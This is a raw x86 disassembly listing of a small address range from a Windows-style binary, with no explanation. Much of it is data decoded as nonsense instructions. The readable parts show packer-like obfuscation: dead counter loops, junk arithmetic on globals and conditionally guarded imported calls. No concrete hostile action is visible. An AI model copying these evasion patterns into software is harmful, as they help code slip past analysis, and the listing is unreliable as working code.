  4030b3:	neg    DWORD PTR [ebp-0x776954d0]
  4030b9:	(bad)  
  4030ba:	in     al,dx
  4030bb:	arpl   WORD PTR [ecx+0x714ee0bb],ax
  4030c1:	call   0x40684930
  4030c6:	bound  edx,QWORD PTR [ebx+0x243b505b]
  4030cc:	loopne 0x403114
  4030ce:	rcl    DWORD PTR [esi-0x281e5cc3],cl
  4030d4:	push   edi
  4030d5:	jl     0x403128
  4030d7:	aam    0x29
  4030d9:	(bad)  
  4030da:	mov    eax,0x9b5ed94b
  4030df:	lea    esp,[ecx]
  4030e1:	bound  eax,QWORD PTR [esi+0x1508408b]
  4030e7:	adc    al,0xf3
  4030e9:	fnstcw WORD PTR [edi-0x9]
  4030ec:	jne    0x403114
  4030ee:	into   
  4030ef:	or     al,BYTE PTR [edi]
  4030f1:	outs   dx,BYTE PTR ds:[esi]
  4030f2:	xchg   edx,eax
  4030f3:	stos   DWORD PTR es:[edi],eax
  4030f4:	imul   ebx,ebp,0xe05ae6e1
  4030fa:	ins    BYTE PTR es:[edi],dx
  4030fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030fc:	test   ebp,ebp
  4030fe:	xor    BYTE PTR [eax-0x33],0xcf
  403102:	inc    edi
  403103:	popf   
  403104:	cmp    cl,BYTE PTR [eax]
  403106:	pop    edi
  403107:	cmp    dl,BYTE PTR [ecx+esi*4+0x0]
  40310b:	sti    
  40310c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40310d:	pop    ss
  40310e:	dec    ebx
  40310f:	cmp    DWORD PTR [esi],edi
  403111:	jne    0x403191
  403113:	cli    
  403114:	data16 arpl WORD PTR [esi],dx
  403117:	pop    ds
  403118:	jmp    0x8677cdb9
  40311d:	push   ebx
  40311e:	jecxz  0x403124
  403120:	mov    ds:0x2fd415a9,al
  403125:	jns    0x4030bb
  403127:	add    eax,0x31e05866
  40312c:	(bad)  
  40312e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40312f:	fild   WORD PTR [edx]
  403131:	je     0x4030c5
  403133:	adc    cl,BYTE PTR [eax+edi*4-0x48]
  403137:	xchg   edi,eax
  403138:	dec    esp
  403139:	ja     0x4030ea
  40313b:	mov    bh,0xff
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	rcl    ecx,0xd1
  40315e:	jne    0x4031c2
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x403107
  403169:	cwde   
  40316a:	sub    eax,0xf56bdc8f
  40316f:	xor    al,0xc2
  403171:	scas   eax,DWORD PTR es:[edi]
  403172:	into   
  403173:	int3   
  403174:	sub    edi,DWORD PTR [ebx]
  403176:	mov    edi,0x2fa9475f
  40317b:	mov    ds:0xd13977e6,al
  403180:	mov    edx,0xa031d740
  403185:	inc    edi
  403186:	jg     0x4031e0
  403188:	push   edx
  403189:	pop    edx
  40318a:	sub    BYTE PTR [edx-0x64],cl
  40318d:	push   ecx
  40318e:	or     esp,eax
  403190:	jne    0x4031e8
  403192:	mov    eax,ds:0xcdc0bd9f
  403197:	xlat   BYTE PTR ds:[ebx]
  403198:	(bad)  
  403199:	shl    BYTE PTR [eax+0x3b],1
  40319c:	rcr    ebp,1
  40319e:	mov    ds:0xf0784f10,al
  4031a3:	out    dx,al
  4031a4:	sbb    BYTE PTR [edx-0x44],dh
  4031a7:	adc    al,0x8a
  4031a9:	mov    eax,ds:0xe8dbee57
  4031ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031af:	aas    
  4031b0:	mov    ebx,0xf9f71196
  4031b5:	lea    esi,[esi-0xd48f972]
  4031bb:	cdq    
  4031bc:	jne    0x40314a
  4031be:	sti    
  4031bf:	and    BYTE PTR [edi],al
  4031c1:	and    BYTE PTR [ebp+0x1a],ah
  4031c4:	inc    esi
  4031c5:	mov    bl,0x80
  4031c7:	aam    0x4b
  4031c9:	ret    
  4031ca:	pop    ds
  4031cb:	addr16 test al,0x5d
  4031ce:	sbb    ch,BYTE PTR [eax+ebp*1]
  4031d1:	(bad)  
  4031d2:	xchg   esp,eax
  4031d3:	sbb    BYTE PTR [esi-0x7c],bl
  4031d6:	in     eax,0xda
  4031d8:	xor    al,0xbb
  4031da:	fdiv   QWORD PTR [ecx]
  4031dc:	sub    DWORD PTR [eax+0x72],esi
  4031df:	sti    
  4031e0:	xor    eax,0x6dc1dbe0
  4031e5:	std    
  4031e6:	pop    ebp
  4031e7:	bound  edi,QWORD PTR [edi-0x21]
  4031ea:	sbb    DWORD PTR [eax+0x6d8a34c8],ebp
  4031f0:	cs cmp esp,eax
  4031f3:	dec    ebx
  4031f4:	jmp    0x40325d
  4031f6:	xchg   BYTE PTR [esp+0x7d],ah
  4031fa:	retf   
  4031fb:	ds mov esp,0x6ec57330
  403201:	adc    BYTE PTR cs:[ebx+0x46c9c1bf],bl
  403208:	pop    ss
  403209:	rcr    BYTE PTR [edi],1
  40320b:	jle    0x4031df
  40320d:	mov    esi,0x62462770
  403212:	sbb    BYTE PTR [edi],cl
  403214:	pop    ebp
  403215:	popa   
  403216:	jecxz  0x403288
  403218:	mov    dl,0x5a
  40321a:	cld    
  40321b:	int    0x1f
  40321d:	mov    esp,0x6f7743ae
  403222:	jmp    0xea1d4517
  403227:	xchg   ebx,eax
  403228:	ja     0x403285
  40322a:	jge    0x40325c
  40322c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40322d:	arpl   WORD PTR [ebx+0x516907b4],di
  403233:	call   0x678684d0
  403238:	adc    cl,BYTE PTR [edx]
  40323a:	leave  
  40323b:	std    
  40323c:	mov    ch,0xd9
  40323e:	fs int 0x49
  403241:	lock pop ecx
  403243:	jne    0x4032bb
  403245:	xor    BYTE PTR [edx],bl
  403247:	popa   
  403248:	mov    ch,0x32
  40324a:	out    dx,al
  40324b:	fwait
  40324c:	shl    BYTE PTR [ecx+0x62],cl
  40324f:	sbb    dl,dl
  403251:	ds adc eax,0x8cfcc284
  403257:	fs xor eax,0x872ca239
  40325d:	sbb    edx,DWORD PTR [edx+0x3e8c0f05]
  403263:	fsubr  QWORD PTR [edx-0x4a969501]
  403269:	into   
  40326a:	adc    al,ch
  40326c:	sub    BYTE PTR [edi+ebx*8+0x28],ah
  403270:	cli    
  403271:	jbe    0x403220
  403273:	add    ch,ch
  403275:	imul   DWORD PTR [edx-0x70c7d869]
  40327b:	pop    es
  40327c:	cmp    DWORD PTR [ebp+0x7c],0x1fbad18
  403283:	pop    esp
  403284:	retf   0xc22b
  403287:	xchg   ah,ch
  403289:	shl    DWORD PTR [ecx],1
  40328b:	xchg   DWORD PTR [ecx+0x461917f4],ebp
  403291:	mov    ds:0xe970c8ea,al
  403296:	push   0xffffffb5
  403298:	mov    ebp,0x3a167fc7
  40329d:	cmp    ecx,DWORD PTR [ecx-0x4cd74bb4]
  4032a3:	push   gs
  4032a5:	push   ecx
  4032a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032a7:	and    BYTE PTR [ebx+0x255dca83],ah
  4032ad:	jb     0x403265
  4032af:	jg     0x40323b
  4032b1:	mov    dl,cl
  4032b3:	xchg   DWORD PTR [ebp+0x61d3e529],ebx
  4032b9:	mov    DWORD PTR [esi+0x6871c387],ecx
  4032bf:	and    eax,0x60abe486
  4032c4:	xchg   dh,bl
  4032c6:	ss std 
  4032c8:	xor    al,0x30
  4032ca:	sub    DWORD PTR [esi+0x2],ebp
  4032cd:	sbb    eax,0x7c0f54c4
  4032d2:	dec    eax
  4032d3:	jmp    0x4032e1
  4032d5:	loopne 0x403339
  4032d7:	sbb    bl,al
  4032d9:	(bad)  
  4032da:	shl    BYTE PTR [ecx-0x5f],0x42
  4032de:	sub    DWORD PTR [edx-0x71998176],ebp
  4032e4:	(bad)  
  4032e5:	sti    
  4032e6:	(bad)  
  4032e7:	pop    edx
  4032e8:	retf   
  4032e9:	mov    eax,0x5b5e9833
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43365b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43365b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43365b,ecx
  40331d:	cmp    DWORD PTR ds:0x43365b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43365b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4336ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4336d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43361f
  40336b:	add    DWORD PTR ds:0x433603,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433657,0x1e
  40338b:	cmp    DWORD PTR ds:0x433657,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433657,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433657,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433657
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433657,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433657
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433657,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4336e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433647
  4033f2:	mov    edi,DWORD PTR ds:0x433687
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433667,0x1c
  40340f:	cmp    DWORD PTR ds:0x433667,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433667,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433667,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433667
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433667,edi
  40344c:	mov    edi,DWORD PTR ds:0x433667
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433667,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4336e3
  403467:	and    edx,DWORD PTR ds:0x433717
  40346d:	mov    DWORD PTR ds:0x4336e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43369b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43371f
  40349f:	adc    DWORD PTR ds:0x4335ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433717,0x10
  4034c6:	cmp    DWORD PTR ds:0x433717,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433717,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433717,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433717
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433717,edi
  403505:	mov    edi,DWORD PTR ds:0x433717
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433717,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43372b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x6bd2d48a]
  403537:	jbe    0x40357a
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	mov    esp,0xa3905483
  403546:	sub    dl,BYTE PTR [esi]
  403548:	cs into 
  40354a:	inc    edx
  40354b:	ds adc ebp,eax
  40354e:	fisubr WORD PTR ss:[eax-0x26]
  403552:	jns    0x4034eb
  403554:	rol    DWORD PTR [ebx],1
  403556:	jle    0x40357b
  403558:	scas   eax,DWORD PTR es:[edi]
  403559:	and    al,0x47
  40355b:	popa   
  40355c:	xor    dl,BYTE PTR [edx-0x2a04c1b4]
  403562:	cld    
  403563:	jle    0x4035b0
  403565:	outs   dx,BYTE PTR ds:[esi]
  403566:	in     eax,0xab
  403568:	aad    0xdf
  40356a:	sub    DWORD PTR [edi+0x4b],0x15f76d5f
  403571:	adc    al,0x8c
  403573:	jecxz  0x40359a
  403575:	mov    WORD PTR [edi],ss
  403577:	cs out 0x32,eax
  40357a:	sub    al,0xe0
  40357c:	test   DWORD PTR [eax],ebx
  40357e:	xchg   ebx,eax
  40357f:	mov    dh,0xb1
  403581:	xchg   ebp,edx
  403583:	das    
  403584:	sar    al,cl
  403586:	or     DWORD PTR [esi],esp
  403588:	push   esp
  403589:	jae    0x40355f
  40358b:	mov    al,0xca
  40358d:	sbb    eax,0xf1adb0b7
  403592:	lds    esp,FWORD PTR [ecx+0x19929eaa]
  403598:	int    0x9e
  40359a:	or     al,0xbf
  40359c:	rcr    DWORD PTR [ecx],1
  40359e:	jo     0x4035e6
  4035a0:	inc    esi
  4035a1:	(bad)  
  4035a2:	mov    ch,0x89
  4035a5:	mov    eax,0xd9f790d
  4035aa:	jns    0x4035c3
  4035ac:	dec    esi
  4035ad:	push   ss
  4035ae:	xor    cl,dh
  4035b0:	sub    DWORD PTR [ecx+ecx*8],esp
  4035b3:	les    edi,FWORD PTR [bx+di-0x3244]
  4035b8:	xor    esp,edi
  4035ba:	jns    0x4035ae
  4035bc:	outs   dx,DWORD PTR ds:[esi]
  4035bd:	in     al,dx
  4035be:	ja     0x403565
  4035c0:	arpl   di,di
  4035c2:	sbb    bh,dh
  4035c4:	out    dx,al
  4035c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035c6:	(bad)  
  4035c8:	sub    BYTE PTR [ebx],ch
  4035ca:	jbe    0x4035e3
  4035cc:	xchg   ebp,eax
  4035cd:	psrld  mm4,QWORD PTR [esp+ebx*2-0x5b0184df]
  4035d5:	jnp    0x4035f5
  4035d7:	inc    ebx
  4035d8:	mov    ebp,0xfb2a40ec
  4035dd:	add    esp,esp
  4035df:	aas    
  4035e0:	out    dx,al
  4035e1:	inc    eax
  4035e2:	retf   0x30e8
  4035e5:	jns    0x4035ae
  4035e7:	enter  0xfa09,0xfb
  4035eb:	rol    DWORD PTR [eax],1
  4035ed:	jl     0x403624
  4035ef:	sub    edx,DWORD PTR [eax]
  4035f1:	xor    al,0x22
  4035f3:	repz mov esp,0xb41d0bf0
  4035f9:	dec    eax
  4035fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035fb:	jnp    0x40366f
  4035fd:	adc    DWORD PTR [edx+0x58335dfa],0x57
  403604:	and    eax,0x5caa2389
  403609:	arpl   WORD PTR [edx],sp
  40360b:	mov    al,0x3a
  40360d:	xchg   edx,eax
  40360e:	sar    DWORD PTR [ebx+esi*2],0xcc
  403612:	jbe    0x403671
  403614:	int3   
  403615:	packuswb mm6,mm2
  403618:	mov    eax,0x5158bb2a
  40361d:	xor    bl,ch
  40361f:	fdiv   DWORD PTR [ecx+0x4]
  403622:	jge    0x403668
  403624:	sti    
  403625:	mov    ah,0x11
  403627:	or     ecx,0xa05f57ba
  40362d:	cmp    al,0xd
  40362f:	fbld   TBYTE PTR [edi*2+0x3fafaa1a]
  403636:	and    al,0xb0
  403638:	xchg   ebx,eax
  403639:	jno    0x403666
  40363b:	dec    ecx
  40363c:	sub    esi,DWORD PTR [edi]
  40363e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40363f:	mul    bh
  403641:	adc    DWORD PTR [ecx-0x7d],ecx
  403644:	cmp    dl,BYTE PTR ds:0xf6c61061
  40364a:	cmp    BYTE PTR [edx-0x4fe5c6d1],dh
  403650:	aas    
  403651:	mov    eax,ds:0x7b81b309
  403656:	rcr    eax,1
  403658:	mov    dl,0x42
  40365a:	and    ah,BYTE PTR [ebx-0x45fc8ded]
  403660:	stc    
  403661:	mov    edx,0xe958ec20
  403666:	inc    edi
  403667:	int3   
  403668:	outs   dx,BYTE PTR ds:[esi]
  403669:	aad    0x2f
  40366b:	dec    ecx
  40366c:	push   ebx
  40366d:	and    al,bl
  40366f:	into   
  403670:	imul   ebp,esi,0x9cf437a2
  403676:	(bad)  
  403677:	and    ah,dh
  403679:	mov    eax,ds:0xe0918ed0
  40367e:	scas   eax,DWORD PTR es:[edi]
  40367f:	retf   0xc495
  403682:	outs   dx,DWORD PTR ds:[esi]
  403683:	sub    BYTE PTR [esp+ebx*1],dh
  403686:	mov    ch,0xc4
  403688:	mov    edx,0xfc66ade7
  40368d:	retf   0x2e51
  403690:	aad    0xd8
  403692:	push   edi
  403693:	xor    BYTE PTR [ebx],al
  403695:	adc    DWORD PTR [eax+0x4fa267f9],edi
  40369b:	jne    0x4036f8
  40369d:	repnz adc eax,DWORD PTR [esi-0x7c]
  4036a1:	push   ebp
  4036a2:	xchg   ecx,eax
  4036a3:	not    esp
  4036a5:	sub    al,0x49
  4036a7:	sub    al,0x46
  4036a9:	ret    0x6a5c
  4036ac:	dec    bh
  4036ae:	jmp    0x40371b
  4036b0:	test   eax,0xe464b07a
  4036b5:	cmp    BYTE PTR [ebp-0x16],0x5b
  4036b9:	cmp    BYTE PTR [esi],al
  4036bb:	mov    ah,0x91
  4036bd:	std    
  4036be:	mov    ch,0xbb
  4036c0:	icebp  
  4036c1:	sbb    ebp,DWORD PTR [edx]
  4036c3:	dec    esi
  4036c4:	repnz xor BYTE PTR [edi],cl
  4036c7:	mov    al,0xeb
  4036c9:	sbb    edi,0x64
  4036cc:	push   cs
  4036cd:	mov    eax,ds:0x3d3f60c6
  4036d2:	dec    ebx
  4036d3:	pop    ebp
  4036d4:	adc    DWORD PTR [ebx+eax*4+0x11],ebx
  4036d8:	cmp    esi,DWORD PTR [ecx-0x29f854a]
  4036de:	popf   
  4036df:	cld    
  4036e0:	pop    eax
  4036e1:	addr16 adc al,0x9b
  4036e4:	dec    ecx
  4036e5:	out    0xd9,al
  4036e7:	pop    ds
  4036e8:	push   edx
  4036e9:	push   0xdd8778f5
  4036ee:	les    esi,FWORD PTR ds:0xfaf1bcfd
  4036f4:	cmp    ebp,esp
  4036f6:	sbb    ebp,DWORD PTR [ebp-0x21]
  4036f9:	loop   0x403755
  4036fb:	(bad)  
  4036fc:	jp     0x4036c9
  4036fe:	push   ebp
  4036ff:	xchg   esi,eax
  403700:	pop    esi
  403701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403702:	adc    ah,BYTE PTR [edx]
  403704:	idiv   DWORD PTR [ebp-0x20131f30]
  40370a:	lods   al,BYTE PTR ds:[esi]
  40370b:	add    dl,cl
  40370d:	pop    edx
  40370e:	adc    al,0xa8
  403710:	inc    ebx
  403711:	sub    al,0x8f
  403713:	rol    DWORD PTR [ebx],1
  403715:	or     edi,DWORD PTR [edi+0x7784cc8]
  40371b:	cmp    ah,ah
  40371d:	ret    
  40371e:	sbb    al,0x82
  403720:	jg     0x4036bf
  403722:	ins    DWORD PTR es:[edi],dx
  403723:	int3   
  403724:	bound  eax,QWORD PTR [esi+0x39]
  403727:	fdiv   st(2),st
  403729:	stos   DWORD PTR es:[edi],eax
  40372a:	xchg   edi,eax
  40372b:	xor    BYTE PTR [ebx+0x7c7cab83],dh
  403731:	mov    bh,BYTE PTR [esp+ecx*2]
  403734:	add    eax,0xfc937abe
  403739:	fldpi  
  40373b:	pushf  
  40373c:	sub    al,0xd0
  40373e:	sti    
  40373f:	lock push ecx
  403741:	inc    DWORD PTR ds:0xa66e27d7
  403747:	iret   
  403748:	jae    0x4036e4
  40374a:	jmp    0x3c0a:0xb59a74da
  403751:	inc    esp
  403752:	call   FWORD PTR [ebx+0x7829718c]
  403758:	mov    ah,0x1e
  40375a:	mov    edi,0x4d790437
  40375f:	mov    esi,DWORD PTR [ecx+eax*4+0x49]
  403763:	xchg   ebx,eax
  403764:	jno    0x4037d7
  403766:	js     0x4036ea
  403768:	dec    ecx
  403769:	pusha  
  40376a:	test   eax,0x2e36890a
  40376f:	mov    ah,0x9b
  403771:	aam    0xb5
  403773:	pop    ecx
  403774:	mov    bh,0x75
  403776:	aaa    
  403777:	aam    0xd0
  403779:	xchg   BYTE PTR [edi],al
  40377b:	(bad)  
  40377c:	icebp  
  40377d:	adc    eax,0xf5865870
  403782:	ins    DWORD PTR es:[edi],dx
  403783:	test   BYTE PTR [edx+0x3b],al
  403786:	mov    esp,0xf3900a9f
  40378b:	xchg   DWORD PTR [esi],edx
  40378d:	std    
  40378e:	add    eax,0xc1394ab9
  403793:	add    al,0x5b
  403795:	and    DWORD PTR [eax-0x5925c2f6],esp
  40379b:	and    al,0xcf
  40379d:	cmp    dl,BYTE PTR [ecx+0x3b4e3ad7]
  4037a3:	aas    
  4037a4:	pop    esi
  4037a5:	mov    ds:0xe3d93aa2,al
  4037aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ab:	dec    eax
  4037ac:	push   ss
  4037ad:	retf   
  4037ae:	mov    ah,0xb9
  4037b0:	sbb    ebx,edx
  4037b2:	outs   dx,BYTE PTR ds:[esi]
  4037b3:	mov    dl,0xf8
  4037b5:	int3   
  4037b6:	jns    0x403743
  4037b8:	pop    edx
  4037b9:	and    ebx,edi
  4037bb:	fst    DWORD PTR [ebx]
  4037bd:	or     DWORD PTR [eax-0x489b4a70],eax
  4037c3:	lods   eax,DWORD PTR ds:[esi]
  4037c4:	les    edi,FWORD PTR [ecx-0x1c2e32f]
  4037ca:	pop    esp
  4037cb:	cmp    BYTE PTR [esi-0x7cf930c9],bh
  4037d1:	pop    edx
  4037d2:	or     al,0xea
  4037d4:	xchg   BYTE PTR [ebx],bl
  4037d6:	dec    ebx
  4037d7:	jg     0x40377e
  4037d9:	pop    es
  4037da:	adc    eax,0x2c6894ec
  4037df:	jge    0x4037ca
  4037e1:	sbb    eax,0x63cb82dc
  4037e6:	lahf   
  4037e7:	mov    ds:0x22651190,eax
  4037ec:	xor    ebx,esi
  4037ee:	sub    ebx,ecx
  4037f0:	mov    bl,0xa1
  4037f2:	es inc eax
  4037f4:	pop    ecx
  4037f5:	push   ds
  4037f6:	or     DWORD PTR [eax-0x60],esi
  4037f9:	test   eax,0x897a9ed5
  4037fe:	xor    BYTE PTR [edx+0x3ac1c0cf],bl
  403804:	inc    ecx
  403805:	imul   edi,DWORD PTR [ebp-0x18b86293],0xffffffb9
  40380c:	add    edi,edx
  40380e:	lods   eax,DWORD PTR ds:[esi]
  40380f:	test   DWORD PTR [eax+0x3f],ecx
  403812:	jo     0x40382e
  403814:	inc    edi
  403815:	add    al,BYTE PTR [ebx+esi*4-0x15d25330]
  40381c:	cmp    DWORD PTR [esi+ebp*1],ebx
  40381f:	rol    DWORD PTR [esi+eax*4+0x11],1
  403823:	dec    DWORD PTR [edi+0x45c75c96]
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x35fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	ss inc ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43372725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433727
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433727,edi
  403858:	cmp    DWORD PTR ds:0x433727,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433727,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433727
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433727,edi
  40389c:	cmp    DWORD PTR ds:0x433727,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43366b,0x43372b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433693,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4336eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433727,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4336eb,0x4336ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4335fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433617,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433613,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43371b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4335ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4335ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4335ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4335ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4335ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4335ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4335ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4335ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433667
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433613
  4039a6:	sub    edi,DWORD PTR ds:0x433723
  4039ac:	mov    DWORD PTR ds:0x433613,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433607,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433607,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433607,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433607
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433607,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433617
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4335fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4335fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4335fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4335fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
